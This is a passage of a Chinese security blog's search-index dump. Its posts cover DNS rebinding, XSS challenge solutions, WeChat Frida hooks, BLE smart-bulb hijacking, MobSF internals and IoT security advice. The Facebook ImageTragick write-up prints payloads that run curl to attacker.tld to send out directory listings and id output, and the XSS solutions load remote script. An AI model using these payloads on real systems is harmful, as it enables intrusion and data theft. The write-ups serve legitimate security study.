xxe入侵》","tags":[{"name":"安全测试","slug":"安全测试","permalink":"https://adrain09.github.io/tags/安全测试/"}]},{"title":"一些有趣的数学","date":"2017-02-03T03:12:16.000Z","path":"2017/02/03/数学/一些有意思的数学/","text":"0.999…=1？ 有许多的证法都可以证明这个等式，但仍然有很多的人纠结这个概念，下面就是一个很好的证明： 12345x=0.999...10x=9.999...10x-x=9.999...-0.999...9x=9x=1 偶数和自然数一样多每个自然数都有一个等于它两倍的偶数，而每个偶数也都有一个等于它一半的自然数： 123456781&lt;----&gt;22&lt;----&gt;43&lt;----&gt;64&lt;----&gt;85&lt;----&gt;106&lt;----&gt;127&lt;----&gt;148&lt;----&gt;16 就是说，每一个自然数，都有一个与之对应的偶数。 2017年是神奇的年！它是个“顺子数”： 2017=10+9+8+7+6+5+4+3+2+1+987+654+321 预示今年事事一帆风顺！ 它又是个“番子数”：2017=7^3+11^3+7^3 预示今年的努力会事半功倍，得到立方的回报，财富呈现立方增长！ 它还是个“完美数”：2＋0＋1＋7＝10 预示今年万事如意，十全十美！","tags":[{"name":"随笔","slug":"随笔","permalink":"https://adrain09.github.io/tags/随笔/"}]},{"title":"DNS REBINDING","date":"2017-01-23T07:12:16.000Z","path":"2017/01/23/web安全/DNS REBINDING攻击/","text":"DNS 重绑定概要DNS重绑定可以用来攻击同源策略，主要的原理就是控制dns的解析来做一些事情，简单步骤就是在提供了内容之后改变网址解析到的ip 利用dns窃取密码Bang&amp; Olufsen扬声器本身在本地有个未认证的页面呈现出来，/1000/Bo_network_settings.asp访问会出现密码。 恶意网站：attacker.com用到很短的生存时间（TTL），比如60s来记录，页面上包含一个恶意的Javascript有效载荷，利用著名的WebRTC内部IP漏洞获取本机的内部IP地址，对内网进行B&amp;O设备扫描。 可以自动创建并删除图像标记来寻找IP地址包含/images/BO_processing_grey.gif，找到扫描结束，DNS重绑定开始 例如找到地址为：192.168.1.10，我们把这个ip发给攻击者，在客户端的JavaScript负载等待超过一分钟，一分钟之后，在试图得到http://attacker.com/1000/Bo_network_settings.asp。 DNS此时过期，我们将attacker.com解析到了192.168.1.10，此时仍然认为是同源。 绕过SSRF过滤传统的SSRF过滤步骤： 获取到输入的URL，从该URL中提取host 对该host进行DNS解析，获取到解析的IP 检测该IP是否是合法的，比如是否是私有IP等 如果IP检测为合法的，则进入curl的阶段发包 检查分为两次，一个对host进行dns解析，第二次Curl发包进行解析，这两次解析是有时间差的 绕过： 攻击者需要自己持有一个域名，然后将这个域名解析指向自己的DNS Server，在该server上写个解析服务，每次返回不同的解析结果。 这个解析服务每次返回的结果不同，第一次请求DNS查询，结果返回的是101.191.60.117，是一个合法的公网IP，但是第二次请求时，变成了私有IP 10.36.5.215。注意到，这两条记录的ttl都是0，这是为了防止有DNS服务器对解析结果进行缓存 几个测试用脚本 参考连接http://blog.csdn.net/u011721501/article/details/54667714 https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction?_=1485134878505","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"一道小题目","date":"2017-01-22T07:12:16.000Z","path":"2017/01/22/web安全/一道题目/","text":"问题：源地址：http://server.n0tr00t.com/n0js/， 是里面的第二道题目 Please execute the jscode in the iframe(name=hi): prompt location.href 第一个页面： 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt; &lt;title&gt;n0js case2&lt;/title&gt; &lt;/head&gt; &lt;body style=\"margin: -10px 0px 0px 10px;\"&gt; &lt;h1&gt;[n0js] case2&lt;/h1&gt; &lt;span&gt;Please execute the jscode in the iframe(name=hi): prompt location.href&lt;/span&gt;&lt;br&gt; &lt;span&gt;Work: Chrome, Firefox&lt;/span&gt;&lt;br&gt; &lt;span&gt;Datetime: 2016-12-14&lt;/span&gt; &lt;ul&gt; &lt;li&gt;Submit: evi1m0.bat[at]gmail.com&lt;/li&gt; &lt;li&gt;Casetip: dota2 pudge&lt;/li&gt; &lt;li&gt;Subject by: evi1m0 / server.n0tr00t.com&lt;/li&gt; &lt;/ul&gt; &lt;hr&gt; &lt;script&gt; eval(eval((window.location.search.substring(1).split(\"=\")[1]))); &lt;/script&gt; &lt;pre&gt; &lt;iframe name=\"hi\" src=\"//server.n0tr00t.com/n0js/case2_test.html\" style=\"width: 400px;height: 200px;\"&gt;&lt;/iframe&gt; &lt;/pre&gt; &lt;/body&gt;&lt;/html&gt; 第二个页面： 12345678910111213141516171819202122232425262728&lt;script&gt;function getos() &#123; var sUserAgent = navigator.userAgent; var isWin = (navigator.platform == \"Win32\") || (navigator.platform == \"Windows\"); var isMac = (navigator.platform == \"Mac68K\") || (navigator.platform == \"MacPPC\") || (navigator.platform == \"Macintosh\") || (navigator.platform == \"MacIntel\"); if (isMac) return \"Mac\"; var isUnix = (navigator.platform == \"X11\") &amp;&amp; !isWin &amp;&amp; !isMac; if (isUnix) return \"Unix\"; var isLinux = (String(navigator.platform).indexOf(\"Linux\") &gt; -1); if (isLinux) return \"Linux\"; if (isWin) &#123; var isWin2K = sUserAgent.indexOf(\"Windows NT 5.0\") &gt; -1 || sUserAgent.indexOf(\"Windows 2000\") &gt; -1; if (isWin2K) return \"Win2000\"; var isWinXP = sUserAgent.indexOf(\"Windows NT 5.1\") &gt; -1 || sUserAgent.indexOf(\"Windows XP\") &gt; -1; if (isWinXP) return \"WinXP\"; var isWin2003 = sUserAgent.indexOf(\"Windows NT 5.2\") &gt; -1 || sUserAgent.indexOf(\"Windows 2003\") &gt; -1; if (isWin2003) return \"Win2003\"; var isWinVista= sUserAgent.indexOf(\"Windows NT 6.0\") &gt; -1 || sUserAgent.indexOf(\"Windows Vista\") &gt; -1; if (isWinVista) return \"WinVista\"; var isWin7 = sUserAgent.indexOf(\"Windows NT 6.1\") &gt; -1 || sUserAgent.indexOf(\"Windows 7\") &gt; -1; if (isWin7) return \"Win7\"; &#125; return \"other\";&#125;document.write('OS:'+getos()+'&lt;br&gt;UA:'+window.parent.navigator.userAgent);&lt;/script&gt; 解法1http://server.n0tr00t.com/n0js/case2.html?a=window.location.hash.substring(1)#Object.defineProperty(navigator,'userAgent',&#123;get:function()&#123;return '&lt;script&gt;prompt(location.href)&lt;/script&gt;';&#125;&#125;) 1http://server.n0tr00t.com/n0js/case2.html?a=location.hash.substr(1)#setTimeout(\"w=window['hi'];s=w.document.createElement('script');s.src='http://ssss/1.js';w.document.body.appendChild(s);\", 2000) 1http://server.n0tr00t.com/n0js/case2.html?test=window.location.hash.substr(1)#window.addEventListener('load', function()&#123;window.hi.prompt(hi.location.href)&#125;) 12345678case2.html?a=location.hash.substr(1)#function createProperty(value)&#123;var _value=value;function _get()&#123;return _value&#125;function _set(v)&#123;_value=v&#125;return&#123;\"get\":_get,\"set\":_set&#125;&#125;; function makePropertyWritable(objBase,objScopeName,propName,initValue)&#123;var newProp,initObj;if(objBase&amp;&amp;objScopeName in objBase&amp;&amp;propName in objBase[objScopeName]) &#123;if(typeof initValue===\"undefined\")&#123;initValue=objBase[objScopeName][propName]&#125; newProp=createProperty(initValue);try&#123;Object.defineProperty(objBase[objScopeName],propName,newProp)&#125; catch(e)&#123;initObj=&#123;&#125;;initObj[propName]=newProp; try&#123;objBase[objScopeName]=Object.create(objBase[objScopeName],initObj)&#125;catch(e)&#123;&#125;&#125;&#125;&#125;; makePropertyWritable(window,\"navigator\",\"userAgent\"); window.navigator.userAgent=\"&lt;script&gt;prompt(location.href)&lt;/script&gt;\"; / @1124696276 12case2.html?a=location.hash.substr(1)#var frame = document.createElement('iframe'); frame.style.display = 'none'; document.body.appendChild(frame); function navigator()&#123;&#125; window.navigator = new Proxy(window.frames[0].window.navigator, &#123; get: function(n0t)&#123;return \"&lt;img src=@ onerror=alert(location.href)&gt;\";&#125; &#125;) / @evi1m0 1case2.html?a=location.hash.substr(1)#setTimeout(\"hi.eval('prompt(location.href)')\",500) / @fyth 1case2.html?a=location.hash.substr(1)#navigator.__defineGetter__('userAgent', function()&#123; return '&lt;svg/onload=prompt(location.href)&gt;'&#125;) / @fyth 分析对以上poc进行分析，其实就是两种解法，一个是利用第二个页面中的document.write，里面输出的是浏览器的UA，思路就是改变UA的值;另一个解法是利用窗口本身，再iframe里面执行js脚本输出","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"微信hook函数收集","date":"2017-01-20T01:12:16.000Z","path":"2017/01/20/移动安全/微信函数收集/","text":"主要搜集网上出现的微信函数，便于frida和exposed的插件编写 微信骰子的判断函数判断函数为com.tencent.mm.sdk.platformtools.be类的tx函数。(Randon函数) frida hook代码： 123456789101112131415scr = &quot;&quot;&quot;Java.perform(function () &#123;var be= Java.use(&quot;com.tencent.mm.sdk.platformtools.be&quot;);send(typeof(be));send(typeof(be.tx));send(&quot;start&quot;)be.tx.implementation = function()&#123; //替换be类中的tx函数 var type = arguments[0]; send(&quot;start&quot;) send(&quot;type=&quot;+type); return 5;&#125;;send(&quot;end&quot;)&#125;);&quot;&quot;&quot;","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"破解智能灯泡","date":"2017-01-19T06:12:16.000Z","path":"2017/01/19/智能硬件/破解智能灯泡/","text":"源地址：http://blog.attify.com/2017/01/17/exploiting-iot-enabled-ble-smart-bulb-security/ 设备需求 笔记本电脑 Ubertooth 蓝牙嗅探设备 hcitool ubertooth-utils Gatttool 基本概念 UUID, 就是用来唯一识别一个特征值的ID. handle，就是对应的attribute 的一个句柄 所有对特征值的操作，都是通过对UUID 的搜索得到对应的handle之后，通过handle来操作特征值的。 步骤连接智能灯泡，确保能正常工作，手机app端保证能正常开启关闭灯泡 Step1 获取灯泡蓝牙地址命令： 1hcitool lescan 扫描结果： 从图中可以看到地址为：88:C2:55:CA:E9:4A，设备名称是：cnligh Step2 获取设备运行服务命令： 1234gatttool -Iconnect 88:C2:55:CA:E9:4Aprimary 存在三个uuid值，其中00001800 和 00001801 是蓝牙标准中定义的服务器描述， UUID 0000f371 是私有定义的 Step3 列举私有uuid的handles使用在uuid 0000f371中的特殊的属性值和组结束handles来列举所有的handles 1char-desc 0x0010 0xffff 从上图可以看到所有的handles 可以参考：https://www.bluetooth.com/specifications/gatt/services 了解每个handle的意义 获取可读写handle有很多的handle，我们不知道那些是可写的，我们尝试读取他们的handle 值 1char-read-hnd 0x0012 得到一个错误提示，这里还有个小问题，我们不知道蓝牙包的结构，这就需要使用ubertooth来获取蓝牙数据包 获取蓝牙数据包嗅探命令 1ubertooth-btle -f -t88:C2:55:CA:E9:4A 为了获取数据包，可以使用 1ubertooth-btle -f -t88:C2:55:CA:E9:4A -c smartbulb_dump.pcap -c是为了保存数据到pcap文件中 这时候打开app连接灯泡，进行开关操作，这时候就会获取到数据包信息 从图中可以看出： 接入地址为 0x8e89bed6处于37频道数据包PDU 为ADV_IND，意味着这个是已经连接的，可扫描的，有回复的设备地址为：88:c2:55:ca:e9:4a 从上图可以看到，app的扫描请求和设备的回复 Wireshark分析数据包为了方便可以直接使用Wireshark来分析捕获到的数据包 过滤出ATT的数据包：btl2cap.cid==0x004 下面直接找写入操作的数据包 可以看到写入的handle正是0x0012 分析写操作，是可以找到地址、crc校验值、操作码，和uuid的 access address: 0xaf9a9515master and slave addressCRC: 0x6dcb5handle: 0x0012UUID: 0xfff1value : 03c90006000a03000101000024ff000000006 操作灯泡改变颜色 1234char-write-req 0x0012 03c90006000a03000101000024ff00000000 //bluish greenchar-write-req 0x0012 03c90006000a0300010100ff000000000000 // Redchar-write-req 0x0012 03c90006000a030001010000ff0000000000 //Greenchar-write-req 0x0012 03c90006000a03000101000000ff00000000 // Blue 改变开关状态 12char-write-req 0x0012 03c90006000a030101010000000000000000 //Offchar-write-req 0x0012 03c90006000a0300010100ff000000000000 //On","tags":[{"name":"智能硬件","slug":"智能硬件","permalink":"https://adrain09.github.io/tags/智能硬件/"}]},{"title":"facebook 命令执行","date":"2017-01-18T03:12:16.000Z","path":"2017/01/18/安全测试/facebook命令执行/","text":"文章地址：http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html 对文章中的过程进行了简单的分析： 分析在facebook分享页面会有个图像的链接地址: https://www.facebook.com/dialog/feed?app_id=APP_ID&amp;link=link.example.tld&amp;picture=http%3A%2F%2Fattacker.tld%2Fexploit.png&amp;name=news_name&amp;caption=news_caption&amp;description=news_descriotion&amp;redirect_uri=http%3A%2F%2Fwww.facebook.com&amp;ext=1476569763&amp;hash= 在页面中会对图像进行处理，变成连接： https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb 源地址为： https://www.google.com/images/errors/robot.png 注意到一点，源地址图像大小为171×213，而处理后的图像大小为158×158 SSRF漏洞https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb url中存在ssrf漏洞 ImageMagick命令执行这个是图像处理时候产生的漏洞，从第一步可以看到图像进行了大小的处理，有可能会存在ImageMagick命令执行 利用第一个payload： 1234push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 &apos;https://127.0.0.1/x.php?x=%60curl &quot;http://attacker.tld/&quot; -d @- &gt; /dev/null`&apos;pop graphic-context 没有成功 利用dns传输第二个payload： 1234push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 &apos;https://127.0.0.1/x.php?x=%60curl &quot;http://record_under_attacker_controled_ns_server.attacker.tld/&quot; -d @- &gt; /dev/null`&apos;pop graphic-context 利用了自己能控制的dns解析，得到结果： 12IP: 31.13.*.*; NetName: LLA1-11NAME: record_under_attacker_controled_ns_server.attacker.tld, Type: A 命令得到了执行 第三个payload： 1234push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 &apos;https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl &quot;http://$i.attacker.tld/&quot; -d @- &gt; /dev/null; done`&apos;pop graphic-context 结果： 12345NAME: home.attacker.tld, Type: ANAME: boot.attacker.tld, Type: 28NAME: dev.attacker.tld, Type: 28NAME: bin.attacker.tld, Type: A… id执行： 123NAME: uid=99(nobody).attacker.tld., Type: 28NAME: groups=99(nobody).attacker.tld., Type: ANAME: gid=99(nobody).attacker.tld., Type: A","tags":[{"name":"安全测试","slug":"安全测试","permalink":"https://adrain09.github.io/tags/安全测试/"}]},{"title":"H5中的Object URL","date":"2017-01-17T03:12:16.000Z","path":"2017/01/17/web安全/Blob_urls/","text":"Object URL不像Data URI包含内容的Base64编码，不管背后代表的File或Blob物件有多大，都只有一个短短的GUID，真正的内容被储存在浏览器记忆体中 Object URL像个号码牌，凭着它可以向浏览器提领内容。 换个角度，http%3A//www.darkthrad.net/c94d498b-7818-49b3-8e79-d3959938ba0f的形式，有点像是跟http: //www.darkthread.net网站取得名为c94d498b-7818-49b3-8e79-d3959938ba0f的资源，但读取时不需真的发出HTTP Request，直接由浏览器提取即可。 由于物件内容被储存在浏览器记忆体，注定了Object URL的生命週期得紧紧地跟网页绑在一起，就像JavaScript变数一般，需等到网页载入后，透过URL.createObjectURL()为File或Blob物件建立Object URL，网页结束后自动失效，或是确定不要后呼叫URL.revokeObjectURL()主动将其注销节省记忆体 blob url的内容存储在浏览器内存中.读取时候不发出http请求,直接在内存中进行读取 创建方法: 12345var aFileParts = [&apos;&lt;script&gt;location.href=&quot;http://xxx.com/277634777&quot;;window.open(&quot;http://xxxx/wblocation.php&quot;, &quot;hello2&quot;);&lt;\\/script&gt;&apos;];var blob=new Blob(aFileParts,&#123;type:&quot;text/html; charset=utf-8&quot;&#125;);var url=URL.createObjectURL(blob);window.open(url, &apos;hello&apos;); new Blob 方法:1234Blob Blob( [optional] Array parts, [optional] BlobPropertyBag properties); parts:一个数组，包含了将要添加到Blob对象中的数据。数组元素可以是任意多个的ArrayBuffer，ArrayBufferView (typed array)， Blob，或者 DOMString对象。 properties:一个对象，设置Blob对象的一些属性,包括: type:设置该Blob对象的type属性。 URL.createObjectURL方法:创建一个本地的objectURL对象 window.open打开本地的objectURL对象,由于同一个window,直接同源可以进行操作","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"H5新增安全策略","date":"2017-01-10T07:12:16.000Z","path":"2017/01/10/web安全/H5安全策略/","text":"新标签下的xssHTML新定义了很多的标签，这些可能导致新的xss产生 iframe中的sandbox&lt;iframe&gt; 一直被用来做挂马、XSS、点击劫持等攻击，这个sandbox可以限制iframe中的脚本执行 &lt;iframe&gt;中的内容被视为独立的源，其中的及哦啊本将被禁止、表单禁止提交，插件禁止加载，指向其他浏览对象的链接也会禁止 sandbox的属性可以通过参数来增加更为准确的控制 allow-same-origin: 允许同源访问 allow-top-navigation: 允许访问顶层窗口 allow-forms: 允许提交表单 allow-script: 允许执行脚本 Link Types:noreferer标签指定了noreferer后，请求是将不会发送referer CORS和postMessage跨域资源共享策略，保证了跨域访问的需求，详情见：”跨域获取数据小结“ web Storage水坑攻击原理","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"物联网安全设计","date":"2017-01-10T06:12:16.000Z","path":"2017/01/10/智能硬件/物联网安全设计/","text":"在设计开发阶段考虑安全问题任何网络连接设备都应考虑安全问题，在设计阶段的安全建设，避免了后期因安全问题带来的潜在业务中断和高昂重建成本。而通过注重网络设备安全性，也能为生产商和服务商提供市场分化机遇。建议： 以独特的方式设置难以破解的默认用户名密码。用户从来不会修改由生产商提供的默认用户名密码，很容易被破解。僵尸网络操作者正是利用这些默认密码信息扫描IoT设备，进行攻击感染。当然，强壮的安全控制应该是让用户具有修改禁用某些功能的权限。 使用技术过关和经济可行的主流操作系统。许多IoT设备内置使用了一些老版本的Linux系统，造成更新不及时，带来严重安全隐患。 使用安全集成硬件以加强设备和安全和完整性防护。例如，在处理器中嵌入安全集成芯片，并提供加密和匿名功能。 在设计中考虑系统和操作中断因素。只有了解造成设备故障的原因，才能制订有效的安全策略，甚至在某些可行情况下，为了减缓故障的严重性，开发商应该为设备设计一种安全无损的失效模式。 加强安全更新和漏洞管理即使在设计阶段考虑了安全性，但在产品使用后还是会发现一些漏洞，这些漏洞可以通过更新和漏洞管理策略来进行缓解。对于这些缓解策略的制订者来说，应该充分考虑设备故障造成的影响、设备运行持续性和预期维修成本。而对于生产商来说，在漏洞威胁日趋严重的网络环境中，如果没有部署或设置安全更新能力，可能就会面对昂贵地召回或在遗弃不管的选择。建议： 考虑通过网络或其它自动化方式对设备进行安全加固更新。理想情况下，补丁应该通过加密和完整性验证方式来自动化更新。 考虑协调第三方供应商来进行软件更新，以解决和改进漏洞管理模式，确保消费者使用设备具有一整套的安全防护措施。 开发漏洞自动化处理更新机制。例如，在软件工程领域，建立来自安全研究者和黑客社区的漏洞报告实时信息获取机制，这对软件开发人员或后期维护人员来说都能得到及时的信息反馈和响应。 制订一个漏洞协调披露和处理政策。该政策应该涉及开发商、生产商、服务商和应急响应组织(CSIRT)，通过应急响应组织，如US-CERT、ICS-CERT提供的漏洞报告进行定期的漏洞分析和预警。 针对物联网设备制订一个使用期限策略。IoT设备不可能进行无限期的更新和升级，开发人员应了解生产商和消费者期望，考虑设备使用期限问题，并明确超出使用期限带来的安全风险。 建立一套公认的安全操作方法许多针对传统IT和网络安全的操作实践可以应用于IoT领域，这些方法可以帮助识别漏洞、检测合规性、响应预警和快速恢复。建议： 实践基本的软件安全和网络安全做法，并通过适配、灵活和创新的方式应用于IoT生态系统。 参考相关部门的具体实践指导。一些联邦部门制订有相关安全实践条例，如国家高速公路交通安全管理局（NHTSA）发布的《现代汽车网络安全最佳实践指南》、FDA发布的《医疗设备网络安全的售后管理》。 执行深度防御。开发商和生产商应该采用分层防御和用户级别威胁考虑的整体安全防护策略，当某些更新升级失效时，这能很好地发挥作用。 加入漏洞信息共享平台，积极通报漏洞，及时接收第三方安全预警。信息共享平台是提高安全风险意识的关键工具。如DHS和其下属的国家网络安全通信协调中心（NCCIC）等。 优先考虑造成潜在影响的安全措施不同的IoT系统有着不同的风险模型，如工业用户和零售用户所考虑的风险不同，而且不同用户设备造成的安全故障后果也不尽相同，而破坏、数据泄露、恶意攻击等行为将导致潜在的严重后果，应该给予重视。建议： 了解设备的预期用途和使用环境。这将有助于开发商和生产商考虑IoT设备的技术特点、运行机制和必要的安全措施。 以黑客和攻击者视角建立“红队”操作模式，针对应用层、网络层、数据层和物理层进行安全分析测试，由此产生的最终结果和相关缓解策略有助于优先针对某些薄弱地方增加安全措施。 对接入网络的设备进行识别认证，尤其是针对工业和商业领域。引入安全认证功能，将使关键和重要领域用户对其组织架构内的设备和服务进行有效控制管理。 促进整个物联网生命周期的透明度开发商和生产商应该了解其组织外部供应链使用或提供的软硬件相关漏洞情况。大多数时候，因为在开发和生产过程中忽略了供应链过程和产品的安全评估，一些代成本、易使用的软硬件会为IoT设备带来很大的安全隐患。另外，由于一些不明的开源软件会应用于IoT设备的开发过程，更增加了由此产生的风险威胁。提高安全意识可以帮助制生产商和工业消费者识别、应用安全措施或建立冗余策略。根据不同产品、开发商、生产商和服务商的可能产生的风险，设置适当的威胁缓解和漏洞处理措施，如更新、产品召回或客户咨询。建议： 进行内部或第三方供应商的端到端风险评估。为了增加安全透明度，开发商、生产商、供应商和服务商都应参风险评估过程。另外，当供应链环节发生改变时，相应的安全措施也应该进行改变或调整。 考虑建立一个关于漏洞报告的公开披露机制，如漏洞众测模式的赏金计划等。 在供应商和生产商之间采用明细的设备部件使用清单，以共建信任机制。一份明细清单对IoT生态系统的风险管理和威胁处理非常有用。 谨慎接入互联网在工业环境和其它关键应用领域的物联网用户，应审慎考虑是否需要把IoT设备接入网络，并清楚由此导致的中断和其它安全风险。在当前复杂的网络环境中，任何物联网设备在其生命周期内都有可能会遭到破坏，物联网设备开发商、生产商和消费者应该了解相关设备被破坏和中断对主要功能和业务运营造成的影响。建议： 建议IoT用户明确任何网络连接性质和目的。如工业控制等一些关键环境使用的IoT设备没必要接入网络。 配置替代性连接方案。为了加强深度防御策略，在不接入互联网的情况下，可以选择配置接入本地网络进行关键信息收集和评估。具体参考：https://ics-cert.us-cert.gov/recommended_practices 在一些选择性连接方案中，允许生产商、服务商和用户禁用特定端口和连接功能。针对不同IoT设备用途，设置用户端指导和控制方案。","tags":[{"name":"智能硬件","slug":"智能硬件","permalink":"https://adrain09.github.io/tags/智能硬件/"}]},{"title":"加强版smail注入","date":"2017-01-10T03:12:16.000Z","path":"2017/01/10/移动安全/加强版Smali Log注入/","text":"可以自己建一个crack.smali文件，并定义自己的Log信息输出函数，如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263.class public Lcrack;.super Ljava/lang/Object;.source \"crack.java\".method public static log1(Ljava/lang/String;)V #打印出info 1字符串 .locals 1 .prologue const-string v0, \"info 1\" invoke-static &#123;v0, p0&#125;, Landroid/util/Log;-&gt;d(Ljava/lang/String;Ljava/lang/String;)I return-void.end method.method public static log2(Ljava/lang/String;)V #打印出info 2字符串 .locals 1 .prologue const-string v0, \"info 2\" invoke-static &#123;v0, p0&#125;, Landroid/util/Log;-&gt;d(Ljava/lang/String;Ljava/lang/String;)I return-void.end method.method public static log3(Ljava/lang/String;)V #打印出info 3字符串 .locals 1 .prologue const-string v0, \"info 3\" invoke-static &#123;v0, p0&#125;, Landroid/util/Log;-&gt;d(Ljava/lang/String;Ljava/lang/String;)I return-void.end method.method public static I(I)V #打印出int型值 .locals 2 .prologue const-string v0, \"info_int\" invoke-static &#123;p0&#125;, Ljava/lang/String;-&gt;valueOf(I)Ljava/lang/String; move-result-object v1 invoke-static &#123;v0, v1&#125;, Landroid/util/Log;-&gt;d(Ljava/lang/String;Ljava/lang/String;)I return-void.end method.method public static J(J)V #打印出long类型的值.locals 2.prologueconst-string v0, \"info_long\"invoke-static &#123;p0, p1&#125;, Ljava/lang/String;-&gt;valueOf(J)Ljava/lang/String;move-result-object v1invoke-static &#123;v0, v1&#125;, Landroid/util/Log;-&gt;d(Ljava/lang/String;Ljava/lang/String;)Ireturn-void.end method 这个时候就只需要添加一行代码就行了： 1invoke-static &#123;v1&#125;, Lcrack;-&gt;log1(Ljava/lang/String;)V 如果是int或者long类型的话，如下调用即可 12invoke-static &#123;v0&#125;, Lcrack;-&gt;I(I)Vinvoke-static &#123;v1,v2&#125;, Lcrack;-&gt;J(J)V","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"MobSF框架分析","date":"2017-01-10T03:12:16.000Z","path":"2017/01/10/移动安全/mobSF架构分析/","text":"总体mobSF使用django框架开发，使用sqlite进行的存储，可以上传代码、app、zip进行扫描，可以进行静态分析和动态分析 静态扫描静态扫描就是反编译apk的过程，对反编译后的代码进行四大组件的分析，在AndroidManifest中把所有能被调用的组建进行查找;后面对代码进行分析，通过工具获取到反编译后的代码，使用正则对代码提取关键子。 过程： 上传apk后，首先进行zip的解压，而后使用AXMLPrinter2.jar提取app中的AndroidManifest.xml文件，对AndroidManifest.xml进行分析，获取暴露出来的 12SERVICES,ACTIVITIES,RECEIVERS,PROVIDERS,LIBRARIES,PERM,PACKAGENAME,MAINACTIVITY,MIN_SDK,MAX_SDK,TARGET_SDK,ANDROVER,ANDROVERNAMEMANIFEST_ANAL,EXPORTED_ACT,EXPORTED_CNT 分析权限找到危险的权限行为 使用CertPrint.jar分析证书问题 后面使用Dex2Jar将dex转变为jar文件，使用到的enjarify 使用Dex2Smali(baksmali.jar)将dex转变为smali代码 使用jd-core.jar、cfr_0_115.jar、procyon-decompiler-0.5.30.jar将jar包转为为可读的java代码 对代码中的字符进行分析，获取app中的url、email等信息 动态分析动态分析的架构比较麻烦，惨用了virtualbox构造app的运行环境，并使用了virtualbox的操作api，利用adb相关操作，设置代理等操作，获取app的运行相关信息 过程： 创建虚拟运行环境获取VM的uuid和Snapshot UUID、运行虚拟机的ip等设置在setting里面。 设置代理startTornado？ 连接虚拟运行环境1adb, &quot;connect&quot;,getIdentifier() 重新挂载123456if settings.REAL_DEVICE: subprocess.call([adb, \"-s\", getIdentifier(), \"shell\", \"su\", \"-c\", \"mount\", \"-o\", \"rw,remount,rw\", \"/system\"])else: subprocess.call([adb, \"-s\", getIdentifier(), \"shell\", \"su\", \"-c\", \"mount\", \"-o\", \"rw,remount,rw\", \"/system\"]) #This may not work for VMs other than the default MobSF VM subprocess.call([adb, \"-s\", getIdentifier(), \"shell\", \"mount\", \"-o\", \"rw,remount\", \"-t\", \"rfs\", \"/dev/block/sda6\", \"/system\"]) 安装app并启动12adb -s 设备id install -r apk_pathadb -s deviceid shell am start -n app 获取运行窗口1[adb, \"-s\", getIdentifier(), \"shell\", \"dumpsys\" ,\"window\"] 抓取运行窗口12subprocess.call([adb, \"-s\", getIdentifier() ,\"shell\", \"screencap\", \"-p\", \"/data/local/screen.png\"])subprocess.call([adb, \"-s\", getIdentifier() ,\"pull\", \"/data/local/screen.png\", SCRDIR + \"screenshot-\"+str(r)+\".png\"]) 启动暴露出的activity和模拟点击12345678subprocess.call([adb, \"-s\", getIdentifier(), \"shell\", \"am\",\"start\", \"-n\", PKG+\"/\"+line])Wait(4)subprocess.call([adb, \"-s\", getIdentifier(), \"shell\", \"screencap\", \"-p\", \"/data/local/screen.png\"])#? get appended from Air :-() if activity names are usedsubprocess.call([adb, \"-s\", getIdentifier(), \"pull\", \"/data/local/screen.png\", SCRDIR + \"expact-\"+str(n)+\".png\"])print \"\\n[INFO] Activity Screenshot Taken\"subprocess.call([adb, \"-s\", getIdentifier(), \"shell\", \"am\", \"force-stop\", PKG])print \"\\n[INFO] Stopping App\" 1args=[adb, \"-s\", getIdentifier(), \"shell\",\"input\",\"tap\",x_axis,y_axis] 安装xposed框架和证书123456789101112131415os.system(adb+' -s '+getIdentifier()+' logcat -d dalvikvm:W ActivityManager:I &gt; \"'+APKDIR + 'logcat.txt\"')print \"\\n[INFO] Downloading Logcat logs\"#os.system(adb+' -s '+getIdentifier()+' logcat -d Xposed:I *:S &gt; \"'+APKDIR + 'x_logcat.txt\"')subprocess.call([adb, \"-s\", getIdentifier(), \"pull\", \"/data/data/de.robv.android.xposed.installer/log/error.log\", APKDIR + \"x_logcat.txt\"])print \"\\n[INFO] Downloading Droidmon API Monitor Logcat logs\"#Can't RCEos.system(adb+' -s '+getIdentifier()+' shell dumpsys &gt; \"'+APKDIR + 'dump.txt\"');print \"\\n[INFO] Downloading Dumpsys logs\"subprocess.call([adb, \"-s\", getIdentifier(), \"shell\", \"am\", \"force-stop\", PACKAGE])print \"\\n[INFO] Stopping Application\"subprocess.call([adb, \"-s\", getIdentifier(), \"shell\", \"am\", \"force-stop\", \"opensecurity.screencast\"])print \"\\n[INFO] Stopping ScreenCast Service\"","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"kafka 常用命令","date":"2017-01-09T03:12:16.000Z","path":"2017/01/09/软件/kafka命令操作/","text":"查看topic1./kafka-topics.sh --zookeeper ip：2181 --list（列出所有topic） 控制台接收信息1bin/kafka-console-consumer.sh --zookeeper ip：2181 --from-beginning --topic test zookeeper命令 dump：列出未完成的会话和临时节点 envi: 打印有关服务环境的详细信息 